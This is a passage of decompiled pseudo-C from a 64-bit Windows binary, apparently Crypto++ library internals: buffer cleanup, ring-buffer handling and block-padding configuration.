  v1 = a1;
  if ( *(_QWORD *)(a1 + 152) >= 0x10ui64 )
    operator delete(*(void **)(a1 + 128));
  *(_QWORD *)(v1 + 152) = 15i64;
  *(_QWORD *)(v1 + 144) = 0i64;
  *(_BYTE *)(v1 + 128) = 0;
  if ( *(_QWORD *)(v1 + 120) >= 0x10ui64 )
    operator delete(*(void **)(v1 + 96));
  *(_QWORD *)(v1 + 120) = 15i64;
  *(_QWORD *)(v1 + 112) = 0i64;
  *(_BYTE *)(v1 + 96) = 0;
  v2 = *(void **)(v1 + 64);
  memset(*(void **)(v1 + 64), 0, *(_QWORD *)(v1 + 56));
  free(v2);
  v3 = *(void (__fastcall ****)(_QWORD, signed __int64))(v1 + 24);
  if ( v3 )
    (**v3)(v3, 1i64);
}

//----- (0000000140058150) ----------------------------------------------------
void __fastcall sub_140058150(__int64 a1)
{
  __int64 v1; // rbx
  void (__fastcall ***v2)(_QWORD, signed __int64); // rcx
  void *v3; // r8
  void (__fastcall ***v4)(_QWORD, signed __int64); // rcx

  v1 = a1;
  v2 = *(void (__fastcall ****)(_QWORD, signed __int64))(a1 + 136);
  if ( v2 )
    (**v2)(v2, 1i64);
  v3 = *(void **)(v1 + 96);
  memset(*(void **)(v1 + 96), 0, *(_QWORD *)(v1 + 88));
  free(v3);
  v4 = *(void (__fastcall ****)(_QWORD, signed __int64))(v1 + 24);
  if ( v4 )
    (**v4)(v4, 1i64);
}

//----- (0000000140058230) ----------------------------------------------------
void __fastcall sub_140058230(__int64 a1)
{
  __int64 v1; // rbx
  void *v2; // rdx
  void (__fastcall ***v3)(_QWORD, signed __int64); // rcx
  void *v4; // r8
  void (__fastcall ***v5)(_QWORD, signed __int64); // rcx

  v1 = a1;
  v2 = *(void **)(a1 + 176);
  memset(*(void **)(a1 + 176), 0, *(_QWORD *)(a1 + 168));
  free(v2);
  v3 = *(void (__fastcall ****)(_QWORD, signed __int64))(v1 + 144);
  if ( v3 )
    (**v3)(v3, 1i64);
  v4 = *(void **)(v1 + 96);
  memset(*(void **)(v1 + 96), 0, *(_QWORD *)(v1 + 88));
  free(v4);
  v5 = *(void (__fastcall ****)(_QWORD, signed __int64))(v1 + 24);
  if ( v5 )
    (**v5)(v5, 1i64);
}

//----- (00000001400582B8) ----------------------------------------------------
_QWORD *__fastcall sub_1400582B8(__int64 a1, char a2)
{
  return sub_1400582F0((void *)(a1 - 8), a2);
}

//----- (00000001400582C4) ----------------------------------------------------
void *__fastcall sub_1400582C4(__int64 a1, char a2)
{
  return sub_140058360((void *)(a1 - 8), a2);
}

//----- (00000001400582D0) ----------------------------------------------------
void *__fastcall sub_1400582D0(__int64 a1, char a2)
{
  return sub_140058390((void *)(a1 - 8), a2);
}

//----- (00000001400582DC) ----------------------------------------------------
void *__fastcall sub_1400582DC(__int64 a1, char a2)
{
  return sub_140058430((void *)(a1 - 8), a2);
}

//----- (00000001400582F0) ----------------------------------------------------
_QWORD *__fastcall sub_1400582F0(void *a1, char a2)
{
  char v2; // si
  _QWORD *v3; // rbx
  void *v4; // r8
  void (__fastcall ***v5)(_QWORD, signed __int64); // rcx

  v2 = a2;
  v3 = a1;
  v4 = (void *)*((_QWORD *)a1 + 12);
  memset(*((void **)a1 + 12), 0, *((_QWORD *)a1 + 11));
  free(v4);
  v5 = (void (__fastcall ***)(_QWORD, signed __int64))v3[3];
  if ( v5 )
    (**v5)(v5, 1i64);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (0000000140058360) ----------------------------------------------------
void *__fastcall sub_140058360(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_1400580A0((__int64)a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (0000000140058390) ----------------------------------------------------
void *__fastcall sub_140058390(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_1400581C0();
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 1400581C0: using guessed type __int64 sub_1400581C0(void);

//----- (0000000140058430) ----------------------------------------------------
void *__fastcall sub_140058430(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_140058230((__int64)a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (0000000140058460) ----------------------------------------------------
__int64 __fastcall sub_140058460(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx

  v2 = a2;
  (*(void (__cdecl **)(_QWORD))(**(_QWORD **)(a1 + 72) + 16i64))(*(_QWORD *)(a1 + 72));
  return v2;
}

//----- (0000000140058490) ----------------------------------------------------
__int64 __fastcall sub_140058490(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx

  v2 = a2;
  (*(void (__cdecl **)(_QWORD))(**(_QWORD **)(a1 + 168) + 16i64))(*(_QWORD *)(a1 + 168));
  return v2;
}

//----- (00000001400584C0) ----------------------------------------------------
__int64 __fastcall sub_1400584C0(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx

  v2 = a2;
  (*(void (__fastcall **)(signed __int64))(*(_QWORD *)(*(_QWORD *)(a1 + 136) + 8i64) + 16i64))(*(_QWORD *)(a1 + 136) + 8i64);
  return v2;
}

//----- (00000001400584F0) ----------------------------------------------------
__int64 __fastcall sub_1400584F0(__int64 a1, void *a2, __int64 a3, _DWORD *a4)
{
  _DWORD *v4; // rbx
  __int64 v5; // rdi
  void *v6; // rbp
  __int64 v7; // rsi
  __int64 result; // rax

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  if ( !qword_1400DAB40
    || !(unsigned __int8)type_info::operator==(&unsigned int `RTTI Type Descriptor', &int `RTTI Type Descriptor')
    || (result = qword_1400DAB40(v5, v4, v7 + 32), !(_BYTE)result) )
  {
    sub_1400293A0(v6, (__int64)&unsigned int `RTTI Type Descriptor', v5);
    result = *(unsigned int *)(v7 + 32);
    *v4 = result;
  }
  return result;
}
// 1400A1928: using guessed type __int64 __fastcall type_info::operator==(_QWORD, _QWORD);
// 1400D8D00: using guessed type int int `RTTI Type Descriptor';
// 1400D9498: using guessed type unsigned int unsigned int `RTTI Type Descriptor';
// 1400DAB40: using guessed type __int64 (__fastcall *qword_1400DAB40)(_QWORD, _QWORD, _QWORD);

//----- (0000000140058580) ----------------------------------------------------
__int64 __fastcall sub_140058580(__int64 a1, void *a2, __int64 a3, _DWORD *a4)
{
  _DWORD *v4; // rbx
  __int64 v5; // rdi
  void *v6; // rbp
  __int64 v7; // rsi
  __int64 result; // rax

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  if ( !qword_1400DAB40
    || !(unsigned __int8)type_info::operator==(
                           &enum  CryptoPP::cls_082::cls_083 `RTTI Type Descriptor',
                           &int `RTTI Type Descriptor')
    || (result = qword_1400DAB40(v5, v4, v7 + 32), !(_BYTE)result) )
  {
    sub_1400293A0(v6, (__int64)&enum  CryptoPP::cls_082::cls_083 `RTTI Type Descriptor', v5);
    result = *(unsigned int *)(v7 + 32);
    *v4 = result;
  }
  return result;
}
// 1400A1928: using guessed type __int64 __fastcall type_info::operator==(_QWORD, _QWORD);
// 1400D8D00: using guessed type int int `RTTI Type Descriptor';
// 1400DAB40: using guessed type __int64 (__fastcall *qword_1400DAB40)(_QWORD, _QWORD, _QWORD);

//----- (0000000140058610) ----------------------------------------------------
__int64 __fastcall sub_140058610(_QWORD *a1)
{
  _QWORD *v1; // rbx
  __int64 v2; // rax
  void (__fastcall ***v3)(_QWORD, signed __int64); // rcx
  __int64 v4; // rdi

  v1 = a1;
  if ( a1[3] )
    return a1[3];
  v2 = (*(__int64 (**)(void))(*a1 + 352i64))();
  v3 = (void (__fastcall ***)(_QWORD, signed __int64))v1[3];
  v4 = v2;
  if ( v3 )
    (**v3)(v3, 1i64);
  v1[3] = v4;
  return v4;
}

//----- (0000000140058670) ----------------------------------------------------
__int64 __fastcall sub_140058670(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx
  __int64 v4; // rdi
  __int64 v5; // rax

  v3 = a3;
  v4 = a2;
  v5 = (*(__int64 (**)(void))(**(_QWORD **)(a1 + 24) + 328i64))();
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)v5 + 264i64))(v5, v4, v3);
}

//----- (00000001400586B0) ----------------------------------------------------
char __fastcall sub_1400586B0(__int64 a1, __int64 a2, unsigned __int8 a3, unsigned int a4)
{
  unsigned int v4; // ebx
  unsigned __int8 v5; // di
  __int64 v6; // rsi
  __int64 v7; // rax

  v4 = a4;
  v5 = a3;
  v6 = a2;
  if ( !*(_BYTE *)(a1 + 32) )
    return 0;
  v7 = (*(__int64 (**)(void))(**(_QWORD **)(a1 + 24) + 328i64))();
  return (*(__int64 (__fastcall **)(__int64, __int64, _QWORD, _QWORD))(*(_QWORD *)v7 + 288i64))(v7, v6, v5, v4);
}

//----- (0000000140058720) ----------------------------------------------------
char __fastcall sub_140058720(__int64 a1, __int64 a2, unsigned int a3, unsigned __int8 a4)
{
  unsigned __int8 v4; // bl
  unsigned int v5; // edi
  __int64 v6; // rsi
  __int64 v7; // rax

  v4 = a4;
  v5 = a3;
  v6 = a2;
  if ( !*(_BYTE *)(a1 + 32) )
    return 0;
  v7 = (*(__int64 (**)(void))(**(_QWORD **)(a1 + 24) + 328i64))();
  return (*(__int64 (__fastcall **)(__int64, __int64, _QWORD, _QWORD))(*(_QWORD *)v7 + 296i64))(v7, v6, v5, v4);
}

//----- (0000000140058790) ----------------------------------------------------
__int64 __fastcall sub_140058790(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rbx
  __int64 v5; // rdi
  __int64 v6; // rsi
  __int64 v7; // rbp
  __int64 v8; // rax

  v4 = a1;
  v5 = a4;
  v6 = a3;
  v7 = a2;
  v8 = (*(__int64 (**)(void))(**(_QWORD **)(a1 + 24) + 328i64))();
  *(_BYTE *)(v4 + 32);
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64, __int64))(*(_QWORD *)v8 + 272i64))(v8, v7, v6, v5);
}

//----- (0000000140058810) ----------------------------------------------------
__int64 __fastcall sub_140058810(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rbx
  __int64 v5; // rdi
  __int64 v6; // rsi
  __int64 v7; // rbp
  __int64 v8; // rax

  v4 = a1;
  v5 = a4;
  v6 = a3;
  v7 = a2;
  v8 = (*(__int64 (**)(void))(**(_QWORD **)(a1 + 24) + 328i64))();
  *(_BYTE *)(v4 + 32);
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64, __int64))(*(_QWORD *)v8 + 280i64))(v8, v7, v6, v5);
}

//----- (0000000140058890) ----------------------------------------------------
__int64 __fastcall sub_140058890(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rbx
  __int64 v5; // rdi
  __int64 v6; // rsi
  __int64 v7; // rax

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = (*(__int64 (**)(void))(*(_QWORD *)a1 + 320i64))();
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64, __int64))(*(_QWORD *)v7 + 256i64))(v7, v6, v5, v4);
}

//----- (00000001400588E0) ----------------------------------------------------
__int64 __fastcall sub_1400588E0(_QWORD *a1, __int64 a2, _QWORD *a3, __int64 a4, __int64 a5, char a6)
{
  unsigned __int64 v6; // rbx
  _QWORD *v7; // rsi
  unsigned __int64 v8; // r9
  unsigned __int64 v9; // rbp
  __int64 result; // rax

  v6 = a1[6];
  v7 = a3;
  if ( *a3 + a1[7] < v6 )
    v6 = *a3 + a1[7];
  v8 = a4 - *a3;
  v9 = a1[6] - v6;
  if ( v8 < v9 )
    v9 = v8;
  result = (*(__int64 (__fastcall **)(__int64, __int64, unsigned __int64, unsigned __int64, _DWORD, char))(*(_QWORD *)a2 + 272i64))(
             a2,
             a5,
             v6 + a1[5],
             v9,
             0,
             a6);
  if ( !result )
    *v7 += v9;
  return result;
}

//----- (0000000140058970) ----------------------------------------------------
__int64 __fastcall sub_140058970(_QWORD *a1, _QWORD *a2)
{
  unsigned __int64 v2; // rax
  unsigned __int64 v3; // r8

  v2 = a1[4];
  v3 = a1[5];
  if ( v2 <= v3 )
    *a2 = 0i64;
  else
    *a2 = v2 - v3;
  return a1[5] + a1[3];
}

//----- (00000001400589A0) ----------------------------------------------------
__int64 __fastcall sub_1400589A0(__int64 a1)
{
  return (*(__int64 (**)(void))(**(_QWORD **)(a1 + 72) + 32i64))();
}

//----- (00000001400589B0) ----------------------------------------------------
__int64 __fastcall sub_1400589B0(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rax

  v2 = a2;
  v3 = (*(__int64 (**)(void))(**(_QWORD **)(a1 + 24) + 328i64))();
  return (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)v3 + 24i64))(v3, v2);
}

//----- (00000001400589E0) ----------------------------------------------------
__int64 __fastcall sub_1400589E0(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 (__fastcall ***v3)(_QWORD, signed __int64); // rcx
  __int64 v4; // rdi
  __int64 result; // rax

  v2 = a1;
  v3 = *(__int64 (__fastcall ****)(_QWORD, signed __int64))(a1 + 24);
  v4 = a2;
  if ( v3 )
  {
    result = (**v3)(v3, 1i64);
    *(_QWORD *)(v2 + 24) = v4;
  }
  else
  {
    *(_QWORD *)(v2 + 24) = a2;
  }
  return result;
}

//----- (0000000140058A30) ----------------------------------------------------
__int64 __fastcall sub_140058A30(__int64 a1)
{
  int *v1; // rbx
  unsigned int v2; // eax
  unsigned int v3; // er8
  int v4; // eax
  unsigned int v5; // ecx
  int *v6; // rax
  __int64 result; // rax
  unsigned int v8; // [rsp+30h] [rbp+8h]

  v1 = (int *)(a1 + 180);
  v2 = (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 168) + 32i64))(*(_QWORD *)(a1 + 168));
  *v1 = v2;
  v3 = v2;
  if ( !v2 || (v4 = v2 - 1, v4 & v3) )
    v5 = 4096 - 0x1000 % v3;
  else
    v5 = 4096 - (v4 & 0x1000);
  v6 = (int *)&v8;
  v8 = v5;
  if ( v3 >= v5 )
    v6 = v1;
  result = (unsigned int)*v6;
  *v1 = result;
  return result;
}

//----- (0000000140058A90) ----------------------------------------------------
void __fastcall sub_140058A90(__int64 a1, const void *a2)
{
  const void *v2; // rbp
  __int64 v3; // rsi
  char v4; // al
  __int64 *v5; // rcx
  __int64 v6; // rbx
  __int64 v7; // rdi
  __int64 v8; // rax
  unsigned __int64 v9; // rax
  __int64 v10; // rbx
  __int64 v11; // rax
  char v12; // ST20_1

  v2 = a2;
  v3 = a1;
  if ( *(_BYTE *)(a1 + 152) & 1 )
  {
    v4 = (*(__int64 (**)(void))(**(_QWORD **)(a1 + 136) + 56i64))();
    v5 = *(__int64 **)(v3 + 136);
    if ( v4 )
    {
      v6 = *(_QWORD *)(v3 + 144);
      v7 = *v5;
      v8 = (*(__int64 (**)(void))(*v5 + 8))();
      (*(void (__fastcall **)(_QWORD, __int64, const void *, __int64))(v7 + 80))(*(_QWORD *)(v3 + 136), v6, v2, v8);
    }
    else
    {
      v9 = (*(__int64 (**)(void))(*v5 + 8))();
      sub_140038C40(v3 + 160, v9);
      if ( v2 )
        memcpy(*(void **)(v3 + 176), v2, *(_QWORD *)(v3 + 168));
    }
    if ( *(_BYTE *)(v3 + 152) & 4 )
    {
      v10 = *(_QWORD *)(v3 + 168);
      v11 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v3 + 328i64))(v3);
      v12 = 1;
      (*(void (__fastcall **)(__int64, const void *, __int64, _QWORD, char))(*(_QWORD *)v11 + 40i64))(
        v11,
        v2,
        v10,
        0i64,
        v12);
    }
  }
}

//----- (0000000140058B70) ----------------------------------------------------
char __fastcall sub_140058B70(_DWORD *a1, unsigned __int8 a2, int a3, unsigned __int8 a4)
{
  _DWORD *v4; // rbx
  int v5; // ecx
  unsigned __int8 v6; // si
  int v7; // edi
  unsigned __int8 v8; // bp
  __int64 v9; // rax
  unsigned __int8 v10; // ST20_1

  v4 = a1;
  v5 = a1[10];
  v6 = a4;
  v7 = a3;
  v8 = a2;
  if ( v5 )
  {
    if ( v5 != 1 )
      return 0;
  }
  else if ( (*(unsigned __int8 (__fastcall **)(_DWORD *, _QWORD, _QWORD))(*(_QWORD *)v4 + 64i64))(v4, a2, a4) )
  {
    return 1;
  }
  if ( v7 )
  {
    v9 = (*(__int64 (__fastcall **)(_DWORD *))(*(_QWORD *)v4 + 328i64))(v4);
    v10 = v6;
    if ( (*(unsigned __int8 (__fastcall **)(__int64, void **, _QWORD, _QWORD, unsigned __int8))(*(_QWORD *)v9 + 288i64))(
           v9,
           &qword_1400D8080,
           v8,
           (unsigned int)(v7 - 1),
           v10) )
    {
      v4[10] = 1;
      return 1;
    }
  }
  v4[10] = 0;
  return 0;
}

//----- (0000000140058C20) ----------------------------------------------------
char __fastcall sub_140058C20(__int64 a1, unsigned __int8 a2, unsigned int a3, unsigned __int8 a4)
{
  unsigned __int8 v4; // bl
  unsigned int v5; // edi
  unsigned __int8 v6; // si
  __int64 v7; // rax

  v4 = a4;
  v5 = a3;
  v6 = a2;
  if ( !*(_BYTE *)(a1 + 32) )
    return 0;
  v7 = (*(__int64 (**)(void))(**(_QWORD **)(a1 + 24) + 328i64))();
  return (*(__int64 (__fastcall **)(__int64, _QWORD, _QWORD, _QWORD))(*(_QWORD *)v7 + 88i64))(v7, v6, v5, v4);
}

//----- (0000000140058C90) ----------------------------------------------------
void __fastcall sub_140058C90(__int64 a1)
{
  _QWORD *v1; // rbx
  unsigned __int64 v2; // rax
  unsigned __int64 v3; // r9
  unsigned __int64 v4; // r10
  __int64 v5; // r11
  __int64 v6; // r8
  unsigned __int64 v7; // rdx
  __int64 *v8; // rdi
  __int64 *v9; // rcx
  bool v10; // cf
  __int64 *v11; // rax
  __int64 v12; // rdx
  __int64 v13; // r8
  bool v14; // zf
  unsigned __int64 v15; // [rsp+30h] [rbp+8h]
  __int64 v16; // [rsp+38h] [rbp+10h]

  v1 = (_QWORD *)a1;
  if ( *(_BYTE *)(a1 + 72) )
  {
    v2 = *(_QWORD *)(a1 + 56);
    if ( v2 <= 1 )
    {
      v7 = *(_QWORD *)(a1 + 120);
      v15 = v7;
      if ( v7 )
      {
        v8 = (__int64 *)(a1 + 120);
        do
        {
          v9 = &v16;
          v10 = (unsigned __int64)*v8 < v1[12] + v1[11] - v1[16];
          v16 = v1[12] + v1[11] - v1[16];
          v11 = (__int64 *)&v15;
          if ( v10 )
            v9 = v8;
          v10 = *v9 < v7;
          v12 = v1[16];
          if ( v10 )
            v11 = v9;
          v13 = *v11;
          v14 = *v8 == *v11;
          *v8 -= *v11;
          v1[16] = v12 + v13;
          if ( v14 || v12 + v13 == v1[12] + v1[11] )
            v1[16] = v1[12];
          (*(void (__fastcall **)(_QWORD *))(*v1 + 416i64))(v1);
          v7 = v1[15];
          v15 = v7;
        }
        while ( v7 );
      }
    }
    else if ( *(_QWORD *)(a1 + 120) >= v2 )
    {
      do
      {
        v3 = v1[15];
        v4 = v1[13];
        if ( v3 < v4 )
        {
          v5 = 0i64;
        }
        else
        {
          v5 = v1[16];
          v6 = v5 + v4;
          v1[16] = v5 + v4;
          if ( v5 + v4 == v1[12] + v1[11] )
            v6 = v1[12];
          v1[16] = v6;
          v1[15] = v3 - v4;
        }
        (*(void (__fastcall **)(_QWORD *, __int64, _QWORD))(*v1 + 416i64))(v1, v5, v1[7]);
      }
      while ( v1[15] >= v1[7] );
    }
  }
}

//----- (0000000140058DD0) ----------------------------------------------------
unsigned __int64 __fastcall sub_140058DD0(_QWORD *a1, char *a2)
{
  char *v2; // rdi
  _QWORD *v3; // rbx
  unsigned __int64 v5; // rdx
  unsigned __int64 v6; // rbp
  size_t *v7; // rsi
  bool v8; // cf
  __int64 *v9; // rcx
  size_t *v10; // rax
  char *v11; // rdx
  size_t v12; // r14
  bool v13; // zf
  __int64 v14; // [rsp+48h] [rbp+10h]
  unsigned __int64 v15; // [rsp+50h] [rbp+18h]

  v2 = a2;
  v3 = a1;
  if ( !a2 )
    return 0i64;
  v5 = a1[3] * a1[4];
  v6 = a1[5];
  v7 = a1 + 5;
  v8 = v6 < a1[1] + a1[2] - a1[6];
  v14 = a1[1] + a1[2] - a1[6];
  v15 = v5;
  v9 = &v14;
  v10 = &v15;
  if ( v8 )
    v9 = (__int64 *)v7;
  v8 = *v9 < v5;
  v11 = (char *)v3[6];
  if ( v8 )
    v10 = (size_t *)v9;
  v12 = *v10;
  v13 = *v7 == *v10;
  *v7 -= *v10;
  v3[6] = &v11[v12];
  if ( v13 || &v11[v12] == (char *)(v3[1] + v3[2]) )
    v3[6] = v3[2];
  memcpy(v2, v11, v12);
  memcpy(&v2[v12], (const void *)v3[6], *v7);
  *v7 = 0i64;
  return v6;
}

//----- (0000000140058EA0) ----------------------------------------------------
__int64 __fastcall sub_140058EA0(_QWORD *a1)
{
  unsigned __int64 v1; // r11
  unsigned __int64 v2; // rbx
  __int64 result; // rax
  __int64 v4; // r9

  v1 = a1[5];
  v2 = a1[3];
  if ( v1 < v2 )
    return 0i64;
  result = a1[6];
  v4 = result + v2;
  a1[6] = result + v2;
  if ( result + v2 == a1[2] + a1[1] )
    v4 = a1[2];
  a1[6] = v4;
  a1[5] = v1 - v2;
  return result;
}

//----- (0000000140058EF0) ----------------------------------------------------
__int64 __fastcall sub_140058EF0(_QWORD *a1, __int64 *a2)
{
  __int64 *v2; // r8
  __int64 *v3; // r9
  _QWORD *v4; // r10
  __int64 *v5; // rdx
  unsigned __int64 v6; // rax
  __int64 *v7; // rcx
  bool v8; // cf
  __int64 v9; // rcx
  __int64 v10; // rdx
  bool v11; // zf
  unsigned __int64 v13; // [rsp+8h] [rbp+8h]

  v2 = a1 + 5;
  v3 = a2;
  v4 = a1;
  v5 = (__int64 *)&v13;
  v6 = a1[1] + a1[2] - a1[6];
  v7 = v3;
  v8 = *v2 < v6;
  v13 = v6;
  if ( v8 )
    v5 = v2;
  if ( *v5 < (unsigned __int64)*v3 )
    v7 = v5;
  v9 = *v7;
  *v3 = v9;
  v10 = v4[6];
  v4[6] = v10 + v9;
  v11 = *v2 == *v3;
  *v2 -= *v3;
  if ( v11 || v4[6] == v4[1] + v4[2] )
    v4[6] = v4[2];
  return v10;
}

//----- (0000000140058F60) ----------------------------------------------------
char __fastcall sub_140058F60(_BYTE *a1)
{
  _BYTE *v1; // rbx

  v1 = a1;
  if ( a1[32] || (*(unsigned __int8 (**)(void))(*(_QWORD *)a1 + 128i64))() )
    return 0;
  v1[32] = 1;
  return 1;
}

//----- (0000000140058F90) ----------------------------------------------------
__int64 __fastcall sub_140058F90(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 result; // rax
  char v4; // [rsp+28h] [rbp-80h]
  __int64 v5; // [rsp+38h] [rbp-70h]
  __int64 v6; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v7)(void *); // [rsp+50h] [rbp-58h]
  int v8; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v10; // [rsp+80h] [rbp-28h]
  __int64 v11; // [rsp+88h] [rbp-20h]

  result = (*(__int64 (__fastcall **)(__int64, __int64, int *))(*(_QWORD *)a1 + 8i64))(
             a1,
             a3,
             &int `RTTI Type Descriptor');
  if ( !(_BYTE)result )
  {
    v6 = 15i64;
    v5 = 0i64;
    v4 = 0;
    sub_140004F20(&v4, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v7);
    v7 = &off_1400A8798;
    v8 = 1;
    v11 = 15i64;
    v10 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v4, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v7 = &off_1400A8798;
    CxxThrowException(&v7, &_TI3_AVcls_001_CryptoPP__);
  }
  return result;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;
// 1400D8D00: using guessed type int int `RTTI Type Descriptor';

//----- (0000000140059080) ----------------------------------------------------
__int64 __fastcall sub_140059080(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4, unsigned __int64 a5)
{
  unsigned __int64 v5; // rdi
  __int64 v6; // rbx
  __int64 result; // rax
  unsigned __int64 v8; // [rsp+30h] [rbp+8h]

  v5 = a4;
  v6 = a1;
  v8 = a4;
  if ( *(_QWORD *)(a1 + 8) < a4 )
  {
    result = (*(__int64 (__fastcall **)(__int64, __int64, unsigned __int64 *))(*(_QWORD *)a2 + 264i64))(a2, a3, &v8);
    if ( v8 >= v5 )
      return result;
    sub_140038C40(v6, a5);
  }
  return *(_QWORD *)(v6 + 16);
}

//----- (00000001400590E0) ----------------------------------------------------
__int64 __fastcall sub_1400590E0(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rdi
  __int64 v5; // rbx
  __int64 result; // rax
  unsigned __int64 v7; // [rsp+30h] [rbp+8h]

  v4 = a4;
  v5 = a1;
  v7 = a4;
  if ( *(_QWORD *)(a1 + 8) < a4 )
  {
    result = (*(__int64 (__fastcall **)(__int64, __int64, unsigned __int64 *))(*(_QWORD *)a2 + 264i64))(a2, a3, &v7);
    if ( v7 >= v4 )
      return result;
    sub_140038C40(v5, v4);
  }
  return *(_QWORD *)(v5 + 16);
}

//----- (0000000140059140) ----------------------------------------------------
__int64 __fastcall sub_140059140(__int64 a1, __int64 a2, int a3)
{
  int v3; // edi
  __int64 v4; // rsi
  __int64 v5; // rbx
  __int64 result; // rax
  __int64 v7; // rax

  v3 = a3;
  v4 = a2;
  *(_DWORD *)(a1 + 40) = 0;
  *(_QWORD *)(a1 + 32) = 0i64;
  v5 = a1;
  result = (*(__int64 (**)(void))(*(_QWORD *)a1 + 56i64))();
  if ( v3 )
  {
    v7 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v5 + 328i64))(v5);
    result = (*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)v7 + 80i64))(
               v7,
               v4,
               (unsigned int)(v3 - 1));
  }
  return result;
}

//----- (00000001400591A0) ----------------------------------------------------
void __fastcall sub_1400591A0(__int64 a1, __int64 a2, unsigned int a3)
{
  unsigned int v3; // ebx
  __int64 v4; // rdi
  __int64 v5; // rax

  v3 = a3;
  v4 = a2;
  if ( *(_BYTE *)(a1 + 32) )
  {
    v5 = (*(__int64 (**)(void))(**(_QWORD **)(a1 + 24) + 328i64))();
    (*(void (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)v5 + 80i64))(v5, v4, v3);
  }
}

//----- (00000001400591E0) ----------------------------------------------------
__int64 __fastcall sub_1400591E0(__int64 a1)
{
  return (*(__int64 (**)(void))(*(_QWORD *)a1 + 384i64))();
}

//----- (00000001400591F0) ----------------------------------------------------
__int64 __fastcall sub_1400591F0(__int64 a1, __int64 a2, _QWORD *a3, _QWORD *a4, __int64 *a5)
{
  _QWORD *v5; // r14
  _QWORD *v6; // rsi
  __int64 v7; // rbx
  signed int v8; // edi
  bool v9; // dl
  __int64 result; // rax
  int v11; // [rsp+20h] [rbp-A8h]
  __int64 v12; // [rsp+28h] [rbp-A0h]
  char v13; // [rsp+30h] [rbp-98h]
  __int64 v14; // [rsp+40h] [rbp-88h]
  __int64 v15; // [rsp+48h] [rbp-80h]
  __int64 (__fastcall **v16)(void *); // [rsp+50h] [rbp-78h]
  int v17; // [rsp+68h] [rbp-60h]
  char Dst; // [rsp+70h] [rbp-58h]
  __int64 v19; // [rsp+80h] [rbp-48h]
  __int64 v20; // [rsp+88h] [rbp-40h]

  v12 = -2i64;
  v5 = a4;
  v6 = a3;
  v7 = a1;
  v8 = 4;
  if ( (*(unsigned __int8 (__fastcall **)(__int64, const char *, void *, int *))(*(_QWORD *)a2 + 8i64))(
         a2,
         "BlockPaddingScheme",
         &enum  CryptoPP::cls_082::cls_083 `RTTI Type Descriptor',
         &v11) )
  {
    v8 = v11;
  }
  v9 = (*(unsigned int (**)(void))(**(_QWORD **)(v7 + 168) + 24i64))() > 1
    && !(*(unsigned int (**)(void))(**(_QWORD **)(v7 + 168) + 72i64))();
  if ( v8 == 4 )
    *(_DWORD *)(v7 + 176) = v9 != 0 ? 2 : 0;
  else
    *(_DWORD *)(v7 + 176) = v8;
  if ( !v9 && (unsigned int)(*(_DWORD *)(v7 + 176) - 2) <= 1 )
  {
    v15 = 15i64;
    v14 = 0i64;
    v13 = 0;
    sub_140004F20(&v13, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v16);
    v16 = &off_1400A8798;
    v17 = 1;
    v20 = 15i64;
    v19 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v13, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v16 = &off_1400A8798;
    CxxThrowException(&v16, &_TI3_AVcls_001_CryptoPP__);
  }
  *v6 = 0i64;
  *v5 = (*(unsigned int (**)(void))(**(_QWORD **)(v7 + 168) + 24i64))();
  result = sub_140059900(*(__int64 **)(v7 + 168), *(_DWORD *)(v7 + 176));
  *a5 = result;
  return result;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;

